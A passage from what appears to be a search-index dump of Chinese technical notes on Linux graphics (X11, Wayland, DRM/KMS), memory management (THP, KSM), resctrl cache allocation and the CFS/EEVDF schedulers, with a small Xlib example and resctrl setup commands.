\u200b\u8d1f\u8d23\u200b\u663e\u793a\u200b\u4ee5\u53ca\u200b\u952e\u76d8\u200b\u9f20\u6807\u200b\u7684\u200b\u4ea4\u4e92\u200b\uff0c\u200b\u5982\u679c\u200b\u7528\u6237\u200b\u64cd\u4f5c\u200b\u4e86\u200b\u952e\u76d8\u200b\u9f20\u6807\u200b\uff0c\u200b\u5219\u200b\u4f1a\u200b\u628a\u200b\u76f8\u5e94\u200b\u7684\u200b\u4e8b\u4ef6\u200b\u901a\u8fc7\u200b Socket \u200b\u901a\u77e5\u200b X Client\u3002</p> <p>\u200b\u8fd9\u79cd\u200b Client/Server \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u4f7f\u5f97\u200b X11 \u200b\u53ef\u4ee5\u200b\u8fdc\u7a0b\u200b\u4f7f\u7528\u200b\uff1a\u200b\u7ecf\u5178\u200b\u7684\u200b SSH X Forwarding\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b\u8fdc\u7a0b\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\u8fd0\u884c\u200b X Client\uff0c\u200b\u7528\u200b\u672c\u5730\u200b\u7684\u200b X Server \u200b\u663e\u793a\u200b\u3002</p> <p>Client \u200b\u548c\u200b Server \u200b\u4e4b\u95f4\u200b\u7684\u200b\u901a\u4fe1\u534f\u8bae\u200b\u662f\u200b X Window System Protocol\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u7528\u200b libX11\uff08Xlib\uff09\u200b\u6216\u8005\u200b XCB\uff08X C Binding\uff09\u200b\u76f4\u63a5\u200b\u5728\u200b X Protocol \u200b\u5c42\u6b21\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u5f00\u53d1\u200b\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u7528\u200b libX11\uff08Xlib\uff09\u200b\u5e93\u6765\u200b\u548c\u200b X Server \u200b\u5efa\u7acb\u200b\u8fde\u63a5\u200b\uff0c\u200b\u521b\u5efa\u200b\u7a97\u53e3\u200b\u5e76\u200b\u7ed8\u5236\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff08\u200b\u6765\u81ea\u200b Rosetta Code\uff09\uff1a</p> <pre><code>#include &lt;X11/Xlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main(void) {\n   Display *d;\n   Window w;\n   XEvent e;\n   const char *msg = \"Hello, World!\";\n   int s;\n\n   d = XOpenDisplay(NULL);\n   if (d == NULL) {\n      fprintf(stderr, \"Cannot open display\\n\");\n      exit(1);\n   }\n\n   s = DefaultScreen(d);\n   w = XCreateSimpleWindow(d, RootWindow(d, s), 10, 10, 100, 100, 1,\n                           BlackPixel(d, s), WhitePixel(d, s));\n   XSelectInput(d, w, ExposureMask | KeyPressMask);\n   XMapWindow(d, w);\n\n   while (1) {\n      XNextEvent(d, &amp;e);\n      if (e.type == Expose) {\n         XFillRectangle(d, w, DefaultGC(d, s), 20, 20, 10, 10);\n         XDrawString(d, w, DefaultGC(d, s), 10, 50, msg, strlen(msg));\n      }\n      if (e.type == KeyPress)\n         break;\n   }\n\n   XCloseDisplay(d);\n   return 0;\n}\n</code></pre> <p>\u200b\u7f16\u8bd1\u200b\uff1a<code>gcc test.c -lX11 -o test</code> \u200b\u5e76\u200b\u8fd0\u884c\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u4e00\u4e2a\u200b\u7a97\u53e3\u200b\uff0c\u200b\u7a97\u53e3\u200b\u4e0a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6b63\u65b9\u5f62\u200b\u548c\u200b\u4e00\u6bb5\u200b <code>Hello, World!</code>\u3002\u200b\u67e5\u770b\u200b strace\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u200b\u6253\u5f00\u200b\u4e86\u200b <code>/tmp/.X11-unix/</code> \u200b\u4e0b\u9762\u200b\u7684\u200b unix socket\uff0c\u200b\u6bcf\u4e2a\u200b DISPLAY \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b unix socket\uff0c\u200b\u7136\u540e\u200b\u901a\u8fc7\u200b\u5b83\u200b\u548c\u200b X Server \u200b\u8fdb\u884c\u200b\u4e86\u200b\u901a\u4fe1\u200b\u3002</p> <p>\u200b\u53ef\u89c1\u200b\u5728\u200b X11 \u200b\u7684\u200b\u67b6\u6784\u200b\u4e0b\u200b\uff0c\u200b\u5b9e\u9645\u200b\u8d1f\u8d23\u200b\u7ed8\u5236\u200b\u7684\u200b\u662f\u200b Server\uff0cClient \u200b\u4f1a\u200b\u628a\u200b\u547d\u4ee4\u200b\u53d1\u9001\u7ed9\u200b Server\u3002\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u505a\u200b\u6548\u7387\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u4f4e\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8981\u200b\u5728\u200b Client \u200b\u548c\u200b Server \u200b\u4e4b\u95f4\u200b\u6765\u56de\u200b\u901a\u4fe1\u200b\u3002\u200b\u56e0\u6b64\u200b\u540e\u6765\u200b X11 \u200b\u5f15\u5165\u200b\u4e86\u200b Direct Rendering Infrastructure\uff08DRI\uff09\uff1aClient \u200b\u548c\u200b GPU \u200b\u901a\u4fe1\u200b\uff0c\u200b\u8fdb\u884c\u200b\u786c\u4ef6\u52a0\u901f\u200b\u7684\u200b\u7ed8\u5236\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b Client \u200b\u53d1\u9001\u7ed9\u200b Server\uff0c\u200b\u8ba9\u200b Server \u200b\u53bb\u200b\u548c\u200b GPU \u200b\u901a\u4fe1\u200b\u3002</p> <p>Wayland \u200b\u5728\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\u4e0a\u200b\u8d70\u200b\u5f97\u200b\u66f4\u200b\u8fdc\u200b\uff1a\u200b\u628a\u200b\u7ed8\u5236\u200b\u7684\u200b\u5927\u90e8\u5206\u200b\u5de5\u4f5c\u200b\u4ea4\u7ed9\u200b Client\uff0c\u200b\u6b64\u65f6\u200b Server \u200b\u8981\u200b\u8d1f\u8d23\u200b\u7684\u200b\u5c31\u662f\u200b\u628a\u200b\u6765\u81ea\u200b\u4e0d\u540c\u200b Client \u200b\u7ed8\u5236\u200b\u7684\u200b\u5185\u5bb9\u200b\u7ec4\u5408\u6210\u200b\u6700\u540e\u200b\u663e\u793a\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u56e0\u6b64\u200b Wayland \u200b\u7684\u200b Server \u200b\u53eb\u505a\u200b Compositor\u3002Server \u200b\u548c\u200b Client \u200b\u4e4b\u95f4\u200b\u901a\u8fc7\u200b CPU \u200b\u4e0a\u200b\u7684\u200b\u5185\u5b58\u200b\uff08\u200b\u901a\u8fc7\u200b shared memory\uff0cshm\uff09\u200b\u6216\u8005\u200b GPU \u200b\u4e0a\u200b\u7684\u200b\u5185\u5b58\u200b\uff08\u200b\u901a\u8fc7\u200b DMABUF\uff09\u200b\u6765\u200b\u4f20\u8f93\u200b\u8981\u200b\u7ed8\u5236\u200b\u7684\u200b\u50cf\u7d20\u200b\u3002\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u6bcf\u4e2a\u200b Client \u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b framebuffer\uff0c\u200b\u7136\u540e\u200b Server \u200b\u628a\u200b\u6765\u81ea\u200b\u4e0d\u540c\u200b Client \u200b\u7684\u200b framebuffer \u200b\u7ec4\u88c5\u200b\u6210\u200b\u6700\u7ec8\u200b\u663e\u793a\u200b\u51fa\u6765\u200b\u7684\u200b framebuffer\u3002</p>"},{"location":"software/linux_graphics.html#drm-kms","title":"DRM &amp; KMS","text":"<p>Direct Rendering Manager\uff08DRM\uff09\u200b\u662f\u200b\u5185\u6838\u200b\u91cc\u200b\u8d1f\u8d23\u200b\u548c\u200b\u786c\u4ef6\u200b\u6253\u4ea4\u9053\u200b\uff0c\u200b\u540c\u65f6\u200b\u53c8\u200b\u7ed9\u200b\u7528\u6237\u200b\u6001\u200b\u63d0\u4f9b\u200b\u786c\u4ef6\u52a0\u901f\u200b\u80fd\u529b\u200b\u7684\u200b\u9a71\u52a8\u200b\u3002\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u4e00\u4fa7\u200b\uff0c\u200b\u5219\u200b\u662f\u200b Mesa \u200b\u63d0\u4f9b\u200b OpenGL/Vulkan \u200b\u7b49\u200b\u56fe\u5f62\u200b API\u3002\u200b\u53ef\u4ee5\u200b\u7528\u200b drm_info \u200b\u67e5\u770b\u200b\u7cfb\u7edf\u200b\u4e2d\u200b DRM \u200b\u8bbe\u5907\u200b\u7684\u200b\u72b6\u6001\u200b\u3002</p> <p>Kernel Mode Setting\uff08KMS\uff09 \u200b\u662f\u200b\u8ba9\u200b\u5185\u6838\u200b\u8d1f\u8d23\u200b\u914d\u7f6e\u200b\u663e\u793a\u200b\u8f93\u51fa\u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\u7b49\u7b49\u200b\u6a21\u5f0f\u200b\uff08Mode Set\uff09\uff0c\u200b\u56e0\u4e3a\u200b\u53ea\u6709\u200b\u786e\u5b9a\u200b\u4e86\u200b\u5206\u8fa8\u7387\u200b\u7b49\u200b\u53c2\u6570\u200b\uff0c\u200b\u624d\u80fd\u200b\u786e\u5b9a\u200b framebuffer \u200b\u7684\u200b\u5927\u5c0f\u200b\u548c\u200b\u683c\u5f0f\u200b\u3002</p>"},{"location":"software/linux_mm.html","title":"Linux \u200b\u5185\u5b58\u200b\u7ba1\u7406\u200b\uff08Memory Management\uff09","text":""},{"location":"software/linux_mm.html#transparent-huge-page-thp","title":"Transparent Huge Page (THP)","text":"<p>\u200b\u6587\u6863\u200b\uff1aTransparent Hugepage Support</p> <p>\u200b\u81ea\u52a8\u200b\u5408\u5e76\u200b\u591a\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b - \u200b\u7269\u7406\u200b\u5730\u5740\u6620\u5c04\u200b\uff0c\u200b\u5230\u200b\u7c92\u5ea6\u200b\u66f4\u200b\u7c97\u200b\u7684\u200b\u4e00\u7ea7\u200b\u9875\u200b\uff0c\u200b\u6bd4\u5982\u200b 512 \u200b\u4e2a\u200b 4KB \u200b\u5408\u5e76\u200b\u5230\u200b\u4e00\u4e2a\u200b 2MB \u200b\u9875\u200b\uff0c\u200b\u5f53\u7136\u200b\u7269\u7406\u5730\u5740\u200b\u4e5f\u200b\u8981\u200b\u8fde\u7eed\u200b\u3002\u200b\u5408\u5e76\u200b\u7684\u200b\u7c92\u5ea6\u200b\u53d7\u9650\u4e8e\u200b\u9875\u8868\u200b\u7684\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u53ea\u80fd\u200b\u4e00\u7ea7\u200b\u4e00\u7ea7\u200b\u7684\u200b\u5408\u5e76\u200b\u3002</p> <p>mTHP(multi size THP)\uff1a\u200b\u66f4\u200b\u7ec6\u7c92\u5ea6\u200b\u7684\u200b\u5408\u5e76\u200b\uff0c\u200b\u4e0d\u200b\u8282\u7701\u200b\u5185\u5b58\u200b\uff0c\u200b\u4f46\u662f\u200b\u544a\u8bc9\u200b\u786c\u4ef6\u200b\uff0c\u200b\u6709\u200b\u82e5\u5e72\u4e2a\u200b PTE \u200b\u7684\u200b\u6620\u5c04\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b\uff08Contiguous PTE\uff09\uff0c\u200b\u8282\u7701\u200b TLB\u3002\u200b\u9700\u8981\u200b\u786c\u4ef6\u200b\u652f\u6301\u200b\uff1a</p> <ul> <li>RISC-V\uff1aSvnapot\uff0cN=1 \u200b\u8868\u793a\u200b 16 \u200b\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b 4KB page\uff0c\u200b\u4e00\u5171\u200b 64KB \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b TLB entry</li> <li>ARMv8: Contiguous bit\uff0c\u200b\u8bbe\u7f6e\u200b\u540e\u200b\uff0c\u200b\u8fde\u7eed\u200b\u82e5\u5e72\u4e2a\u200b page \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b TLB entry\uff0c\u200b\u4f8b\u5982\u200b 16 \u200b\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b 4KB page \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b TLB entry</li> </ul>"},{"location":"software/linux_mm.html#same-page-merging","title":"Same Page Merging","text":"<p>\u200b\u6587\u6863\u200b\uff1aKernel Samepage Merging</p> <p>\u200b\u8282\u7701\u200b\u5185\u5b58\u200b\uff0c\u200b\u591a\u4e2a\u200b\u865a\u62df\u200b\u9875\u200b\u6620\u5c04\u200b\u5230\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u9875\u200b</p>"},{"location":"software/linux_resctrl.html","title":"Linux \u200b\u8d44\u6e90\u200b\u63a7\u5236\u200b\uff08Resource Control\uff09","text":"<p>\u200b\u5728\u200b Linux \u200b\u4e0a\u200b\u8fd0\u884c\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u5171\u4eab\u200b\u4e86\u200b\u7f13\u5b58\u200b\u548c\u200b\u5185\u5b58\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u4eec\u200b\u4e4b\u95f4\u200b\u662f\u200b\u4f1a\u200b\u4e92\u76f8\u200b\u5f71\u54cd\u200b\u6027\u80fd\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u7ed9\u200b\u67d0\u4e9b\u200b\u7a0b\u5e8f\u200b\u9884\u7559\u200b\u4e00\u5b9a\u200b\u7684\u200b\u8d44\u6e90\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b Linux resctrl(resource control) \u200b\u673a\u5236\u200b\u6765\u200b\u5b9e\u73b0\u200b\u3002</p> <p>\u200b\u5b83\u200b\u80cc\u540e\u200b\u4f9d\u8d56\u200b\u7684\u200b\u662f\u200b\u786c\u4ef6\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u6bd4\u5982\u200b Intel \u200b\u5b9e\u73b0\u200b\u7684\u200b Resource Director Technology(RDT)\uff0c\u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u51e0\u4e2a\u200b\u90e8\u5206\u200b\uff1a</p> <ol> <li>Monitoring\uff1a\u200b\u4e3b\u8981\u200b\u662f\u200b\u76d1\u63a7\u200b\u7f13\u5b58\u200b\u548c\u200b\u5185\u5b58\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5305\u62ec\u200b\uff1a<ol> <li>Cache Monitoring Technology (CMT)\uff0c\u200b\u76d1\u63a7\u200b\u7a0b\u5e8f\u200b\u7684\u200b L3 \u200b\u7f13\u5b58\u200b\u5360\u7528\u200b</li> <li>Memory Bandwidth Monitoring (MBM)\uff0c\u200b\u76d1\u63a7\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u4f7f\u7528\u200b</li> </ol> </li> <li>Allocation\uff1a\u200b\u4e3b\u8981\u200b\u662f\u200b\u9650\u5236\u200b\u7f13\u5b58\u200b\u548c\u200b\u4f7f\u7528\u200b\uff0c\u200b\u5305\u62ec\u200b\uff1a<ol> <li>Cache Allocation Technology (CAT)\uff0c\u200b\u9650\u5236\u200b\u7a0b\u5e8f\u200b\u7684\u200b L2/L3 \u200b\u5360\u7528\u200b\uff0c\u200b\u628a\u200b\u7a0b\u5e8f\u200b\u5212\u5206\u200b\u5230\u200b\u82e5\u5e72\u4e2a\u200b\u7c7b\u200b\uff08Class of Service\uff0c\u200b\u7b80\u79f0\u200b COS \u200b\u6216\u8005\u200b\u53eb\u200b CLOS\uff09\u200b\u91cc\u9762\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7c7b\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b bitmask</li> <li>Code and Data Prioritization (CDP)\uff0c\u200b\u5728\u200b CAT \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u5206\u522b\u200b\u9650\u5236\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u6307\u4ee4\u548c\u6570\u636e\u200b\u7684\u200b L2/L3 \u200b\u5360\u7528\u200b\uff1a\u200b\u6bcf\u4e2a\u200b CAT \u200b\u7684\u200b\u7c7b\u200b\u6709\u200b\u4ece\u200b\u4e00\u4e2a\u200b bitmask \u200b\u53d8\u6210\u200b\u6709\u200b\u4e24\u4e2a\u200b bitmask\uff0c\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u6570\u636e\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u6307\u4ee4\u200b</li> <li>Memory Bandwidth Allocation (MBA)\uff0c\u200b\u9650\u5236\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u4f7f\u7528\u200b</li> </ol> </li> <li>\u200b\u9488\u5bf9\u200b PCIe/CXL \u200b\u5916\u8bbe\u200b\u8bbf\u95ee\u200b L3/\u200b\u5185\u5b58\u200b\u7684\u200b Monitoring \u200b\u548c\u200b Allocation</li> </ol> <p>ARMv8-A \u200b\u5e73\u53f0\u200b\u4e0a\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u529f\u80fd\u200b\u53eb\u505a\u200b MPAM(Memory System Resource Partitioning and Monitoring)\u3002</p> <p>Linux \u200b\u7684\u200b resctrl \u200b\u529f\u80fd\u200b\u901a\u8fc7\u200b sysfs \u200b\u6302\u8f7d\u200b resctrl \u200b\u6765\u200b\u66b4\u9732\u200b\uff1a</p> <pre><code>mount -t resctrl resctrl /sys/fs/resctrl\n# create a new resource group called p0\nmkdir /sys/fs/resctrl/p0\n# add cpu 0-1 (bitmask 3) to p0\necho 3 &gt; /sys/fs/resctrl/p0/cpus\n# add tasks(processes/threads) to p0\necho pid0,pid1 &gt; /sys/fs/resctrl/p0/tasks\n# set L2 #0 bitmask to 0xffc00 for p0\n# you can change global settings at /sys/fs/resctrl/schemata\necho \"L2:0=ffc00;\" &gt; /sys/fs/resctrl/p0/schemata\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5904\u7406\u200b\u5b8c\u200b\uff0c\u200b\u5728\u200b\u6838\u5fc3\u200b 0-1 \u200b\u4e0a\u200b\u8fd0\u884c\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u5c31\u200b\u53ea\u4f1a\u200b\u7528\u5230\u200b L2 \u200b\u7684\u200b\u7531\u200b 0xffc00 \u200b\u6307\u5b9a\u200b\u7684\u200b\u90a3\u200b\u90e8\u5206\u200b\u7f13\u5b58\u200b\u5bb9\u91cf\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1a</p> <ul> <li>Performance tuning at the edge using Cache Allocation Technology </li> <li>User Interface for Resource Control feature</li> <li>Configuring MPAM via resctrl file-system</li> <li>Use Intel\u00ae Resource Director Technology to Allocate Last Level Cache (LLC)</li> <li>resctrl</li> </ul>"},{"location":"software/linux_scheduler.html","title":"Linux Scheduler","text":""},{"location":"software/linux_scheduler.html#cfs-completely-fair-scheduler","title":"CFS Completely Fair Scheduler","text":"<p>\u200b\u6587\u6863\u200b\uff1aCFS Scheduler</p> <p>\u200b\u8bbe\u8ba1\u200b\u76ee\u6807\u200b\uff1a\u200b\u5efa\u6a21\u200b\u4e00\u4e2a\u200b\u7406\u60f3\u200b\u7684\u200b\u591a\u4efb\u52a1\u200b CPU\uff0c\u200b\u5b83\u200b\u4ee5\u200b\u76f8\u540c\u200b\u7684\u200b\u901f\u5ea6\u200b\u5e76\u884c\u200b\u8fd0\u884c\u200b\u591a\u4e2a\u200b\u4efb\u52a1\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u4efb\u52a1\u200b\u8fd0\u884c\u200b\u7684\u200b\u65f6\u95f4\u200b\u4e00\u6837\u200b\u957f\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b CPU \u200b\u4e0d\u200b\u5b58\u5728\u200b\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b\u4efb\u52a1\u200b\u9700\u8981\u200b\u5206\u200b\u65f6\u200b\u6267\u884c\u200b\u3002\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u8bb0\u5f55\u200b\u6bcf\u4e2a\u200b\u4efb\u52a1\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u8ba9\u200b\u4e0d\u540c\u200b\u4efb\u52a1\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u76f8\u540c\u200b\u7684\u200b CPU \u200b\u65f6\u95f4\u200b\u3002CFS \u200b\u8981\u200b\u505a\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8ba9\u200b\u53ef\u4ee5\u200b\u8fd0\u884c\u200b\u7684\u200b\u4efb\u52a1\u200b\u5c3d\u91cf\u200b\u5f97\u5230\u200b\u76f8\u540c\u200b\u7684\u200b CPU \u200b\u65f6\u95f4\u200b\u3002\u200b\u90a3\u200b\u5c31\u8981\u200b\u627e\u5230\u200b\u90a3\u4e9b\u200b\u6ca1\u6709\u200b\u5f97\u5230\u200b\u8db3\u591f\u200b CPU \u200b\u65f6\u95f4\u200b\u7684\u200b\u4efb\u52a1\u200b\uff0c\u200b\u53bb\u200b\u8c03\u5ea6\u200b\u5b83\u4eec\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u8bb0\u5f55\u200b\u8fdb\u7a0b\u200b\u7684\u200b CPU \u200b\u65f6\u95f4\u200b\u4efb\u52a1\u200b\uff0cCFS \u200b\u7ed9\u200b\u6bcf\u4e2a\u200b Task \u200b\u8bb0\u5f55\u200b\u4e86\u200b\u4e00\u4e2a\u200b virtual runtime\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b\u4efb\u52a1\u200b\u7684\u200b virtual runtime \u200b\u6bd4\u200b\u522b\u4eba\u200b\u90fd\u200b\u5c11\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8bf4\u660e\u200b\u5b83\u200b\u5f97\u5230\u200b\u7684\u200b CPU \u200b\u65f6\u95f4\u200b\u4e0d\u591f\u200b\uff0c\u200b\u8981\u200b\u8c03\u5ea6\u200b\u5b83\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u8c03\u5ea6\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u8981\u200b\u627e\u5230\u200b\u5f53\u524d\u200b virtual runtime \u200b\u6700\u5c0f\u200b\u7684\u200b\u4efb\u52a1\u200b\u3002CFS \u200b\u7528\u200b\u5e73\u8861\u200b\u6811\u6765\u200b\u7ef4\u62a4\u200b\u8fd9\u4e2a\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8c03\u5ea6\u200b virtual runtime \u200b\u6700\u5c0f\u200b\u7684\u200b\u4efb\u52a1\u200b\uff0c\u200b\u4ece\u200b\u5e73\u8861\u200b\u6811\u4e2d\u200b\u5220\u9664\u200b\uff0c\u200b\u5f53\u200b\u4efb\u52a1\u200b\u8fd0\u884c\u200b\u4e86\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u540e\u200b\uff0c\u200b\u56de\u5230\u200b\u8c03\u5ea6\u200b\u5668\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b virtual runtime \u200b\u589e\u52a0\u200b\uff0c\u200b\u518d\u200b\u63d2\u5165\u200b\u5e73\u8861\u200b\u6811\u200b\u3002</p> <p>virtual runtime \u200b\u548c\u200b\u5b9e\u9645\u200b runtime \u200b\u7684\u200b\u533a\u522b\u200b\u662f\u200b\uff0c\u200b\u5b83\u200b\u8003\u8651\u200b\u4e86\u200b\u4f18\u5148\u7ea7\u200b\uff1a\u200b\u901a\u8fc7\u200b nice \u200b\u53ef\u4ee5\u200b\u8bbe\u7f6e\u200b\u4efb\u52a1\u200b\u7684\u200b\u6743\u91cd\u200b\uff0c\u200b\u6743\u200b\u91cd\u5927\u200b\u7684\u200b\uff0c\u200b\u76f8\u540c\u200b\u8fd0\u884c\u200b\u65f6\u95f4\u200b\uff0cvirtual runtime \u200b\u589e\u52a0\u200b\u7684\u200b\u5c11\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u5206\u5230\u200b\u66f4\u200b\u591a\u200b\u7684\u200b CPU \u200b\u65f6\u95f4\u200b\u3002</p> <p>\u200b\u6ce8\u610f\u200b CFS \u200b\u8003\u8651\u200b\u7684\u200b\u662f\u200b\u67d0\u4e2a\u200b\u6838\u4e0a\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u8c03\u5ea6\u200b\uff0c\u200b\u5b83\u200b\u4e0d\u7ba1\u200b\u8fdb\u7a0b\u200b\u88ab\u200b\u8c03\u5ea6\u200b\u5230\u200b\u54ea\u4e2a\u200b\u6838\u4e0a\u200b\u3002</p>"},{"location":"software/linux_scheduler.html#eevdf-earliest-eligible-virtual-deadline-first","title":"EEVDF Earliest Eligible Virtual Deadline First","text":"<p>\u200b\u6587\u6863\u200b\uff1aEEVDF Scheduler</p> <p>EEVDF \u200b\u662f\u200b\u5728\u200b CFS \u200b\u57fa\u7840\u200b\u4e0a\u200b\u7684\u200b\u6539\u8fdb\u200b\u3002CFS \u200b\u4e3b\u8981\u200b\u8003\u8651\u200b\u7684\u200b\u662f\u200b\u516c\u5e73\u6027\u200b\uff0c\u200b\u8bb2\u7a76\u200b\u7684\u200b\u662f\u200b\u6240\u6709\u200b\u4efb\u52a1\u200b\u5f97\u5230\u200b\u4e00\u6837\u200b\u591a\u200b\u7684\u200b CPU \u200b\u65f6\u95f4\u200b\u3002EEVDF \u200b\u9664\u4e86\u200b\u8003\u8651\u200b\u516c\u5e73\u6027\u200b\uff0c\u200b\u8fd8\u8981\u200b\u8003\u8651\u200b\u53ca\u65f6\u6027\u200b\uff0c\u200b\u6539\u8fdb\u200b Latency\u3002</p> <p>\u200b\u5b83\u200b\u7684\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u7edf\u8ba1\u200b\u6bcf\u4e2a\u200b\u4efb\u52a1\u200b\u7684\u200b\u5b9e\u9645\u200b\u8fd0\u884c\u200b\u65f6\u95f4\u200b\u548c\u200b\u9884\u671f\u200b\u8fd0\u884c\u200b\u65f6\u95f4\u200b\uff0c\u200b\u5982\u679c\u200b\u5b9e\u9645\u200b\u8fd0\u884c\u200b\u7684\u200b\u6bd4\u200b\u9884\u671f\u200b\u7684\u200b\u5c11\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u88ab\u200b\u8003\u8651\u200b\u53bb\u200b\u8c03\u5ea6\u200b\uff08Eligible\uff09\uff1a\u200b\u5b9e\u9645\u200b\u6bd4\u200b\u9884\u671f\u200b\u5c11\u200b\u7684\u200b\u65f6\u95f4\u200b\u53eb\u505a\u200b lag\uff0c\u200b\u90a3\u4e48\u200b Eligible \u200b\u610f\u5473\u7740\u200b lag \u200b\u975e\u8d1f\u200b\u3002Eligible \u200b\u7684\u200b\u4efb\u52a1\u200b\u53ef\u80fd\u200b\u6709\u200b\u591a\u4e2a\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9009\u53d6\u200b\u5b83\u4eec\u200b virtual deadline \u200b\u6700\u5c0f\u200b\u7684\u200b\u90a3\u4e2a\u200b\u4efb\u52a1\u200b\u53bb\u200b\u8c03\u5ea6\u200b\u3002virtual deadline \u200b\u600e\u4e48\u200b\u8ba1\u7b97\u200b\u7684\u200b\u5462\u200b\uff1f\u200b\u8bba\u6587\u200bEarliest Eligible Virtual Deadline First: A Flexible and Accurate Mechanism for Proportional Share Resource Allocation \u200b\u4e2d\u662f\u200b\u8fd9\u4e48\u200b\u5206\u6790\u200b\u7684\u200b\uff1a</p> <p>\u200b\u8003\u8651\u200b\u4e00\u4e2a\u200b\u5b9e\u65f6\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u9700\u8981\u200b\u5b9a\u671f\u200b\u8fdb\u884c\u200b\u7684\u200b\u4efb\u52a1\u200b\uff0c\u200b\u4f8b\u5982\u200b\u89c6\u9891\u200b\u89e3\u7801\u200b\uff0c\u200b\u5728\u200b\u65f6\u95f4\u200b t \u200b\u6536\u5230\u200b\u4e86\u200b\u4e00\u5e27\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u9700\u8981\u200b\u89e3\u7801\u200b\u5e76\u200b\u663e\u793a\u200b\u5230\u200b\u5c4f\u5e55\u200b\u4e0a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e3a\u4e86\u200b\u663e\u793a\u200b\u7684\u200b\u6d41\u7545\u200b\uff0c\u200b\u80af\u5b9a\u200b\u8981\u200b\u5728\u200b\u4e0b\u200b\u4e00\u5e27\u200b\u4e4b\u524d\u200b\u5b8c\u6210\u200b\u3002\u200b\u5047\u8bbe\u200b\u6bcf\u200b T \u200b\u65f6\u95f4\u200b\u4f1a\u200b\u6536\u5230\u200b\u4e00\u5e27\u200b\uff0c\u200b\u9700\u8981\u200b r \u200b\u65f6\u95f4\u200b\u5b8c\u6210\u200b\u89e3\u7801\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u4efb\u52a1\u200b\u6bcf\u200b T 